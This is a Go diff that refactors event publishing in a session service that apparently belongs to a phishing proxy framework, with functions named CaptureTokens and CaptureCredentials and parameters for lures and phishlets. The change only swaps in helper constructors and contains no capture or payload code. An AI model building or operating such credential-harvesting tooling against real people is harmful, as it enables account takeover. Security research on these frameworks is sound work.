@@ -236,7 +236,7 @@ func (s *SessionService) Complete(session *Session) error {
 
 	s.cache.Delete(session.ID)
 	snap := session.Snapshot()
-	s.Bus.Publish(Event{Type: sdk.EventSessionCompleted, Payload: &snap})
+	s.Bus.Publish(NewSessionCompletedEvent(&snap))
 
 	return nil
 }
@@ -250,7 +250,7 @@ func (s *SessionService) CaptureTokens(session *Session) error {
 		return err
 	}
 	snap := session.Snapshot()
-	s.Bus.Publish(Event{Type: sdk.EventTokensCaptured, Payload: &snap})
+	s.Bus.Publish(NewTokensCapturedEvent(&snap))
 	return nil
 }
 
@@ -259,7 +259,7 @@ func (s *SessionService) CaptureCredentials(session *Session) error {
 		return err
 	}
 	snap := session.Snapshot()
-	s.Bus.Publish(Event{Type: sdk.EventCredsCaptured, Payload: &snap})
+	s.Bus.Publish(NewCredsCapturedEvent(&snap))
 	return nil
 }
 
@@ -301,7 +301,7 @@ func (s *SessionService) Stream(ctx context.Context) <-chan Event {
 	}
 
 	for _, eventType := range sessionEventTypes {
-		unsubs = append(unsubs, SubscribeFunc(s.Bus, eventType, forward))
+		unsubs = append(unsubs, SubscribeAndHandle(s.Bus, eventType, forward))
 	}
 
 	go func() {
@@ -335,7 +335,7 @@ func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishl
 
 	s.cache.Store(sess.ID, sess)
 	snap := sess.Snapshot()
-	s.Bus.Publish(Event{Type: sdk.EventSessionCreated, OccurredAt: time.Now(), Payload: &snap})
+	s.Bus.Publish(NewSessionCreatedEvent(&snap))
 
 	return sess, nil
 }
